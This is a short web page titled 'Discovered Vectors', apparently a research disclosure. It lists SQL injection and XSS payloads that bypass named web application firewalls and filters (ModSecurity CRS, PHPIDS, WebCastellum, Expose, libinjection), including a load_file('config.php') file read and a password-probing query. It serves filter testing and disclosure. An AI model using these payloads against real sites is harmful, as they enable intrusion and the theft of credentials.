---
title: "Discovered Vectors"
permalink: /vectors/
date: 2016-07-19T03:02:20+00:00
author_profile: false
---

| Discovered By    | Vector |    Affected Components                                       |
| --------         | ------ | ------------------------------------------------------------ |
|@istais|`or exists (select 1)`|ModSecurity CRS 2.99, PHPIDS 0.7, WebCastellum, Expose 2.4.0|
|@istais|`1 or a = 1`|ModSecurity CRS 2.99, WebCastellum, Expose 2.4.0|
|@istais|`1 or a like 1`|ModSecurity CRS 2.99, PHPIDS 0.7, WebCastellum, Expose 2.4.0|
|@istais|`and exists (select a)`|ModSecurity CRS 2.99, PHPIDS 0.7, WebCastellum, Expose 2.4.0|
|@istais|`a or a > any select a`|ModSecurity CRS 2.99, PHPIDS 0.7, WebCastellum, Expose 2.4.0|
|@istais|`1 right join a on a = a`|ModSecurity CRS 2.99, WebCastellum|
|@istais|`a group by a asc`|ModSecurity CRS 2.99, PHPIDS 0.7, WebCastellum, Expose 2.4.0|
|@istais|`procedure analyze()`|libinjection|
|@istais|`<p onmouseover=-a() ></p>`|PHPIDS 0.7/ Expose 2.4.0|
|@istais|`<p onmouseover=(a()) ></p>`|PHPIDS 0.7/ Expose 2.4.0|
|@istais|`<p onmouseover=;a() ></p>`|PHPIDS 0.7/ Expose 2.4.0|
|@istais|`<p onmouseover=!a() ></p>`|PHPIDS 0.7/ Expose 2.4.0|
|@istais|`ALTER TABLE a CONVERT TO CHARACTER SET a COLLATE a`|PHPIDS 0.7/ Expose 2.4.0|
|@istais|`ALTER DATABASE a CONVERT TO CHARACTER SET a COLLATE a`|PHPIDS 0.7/ Expose 2.4.0|
|@istais|`1 and passwd rlike 0x726f6f74`|PHPIDS 0.7/ Expose 2.4.0|
|@istais|`1 and passwd like 1234`|ModSecurity CRS 2.99|
|@istais|`load_file('config.php');`|PHPIDS 0.7/ Expose 2.4.0|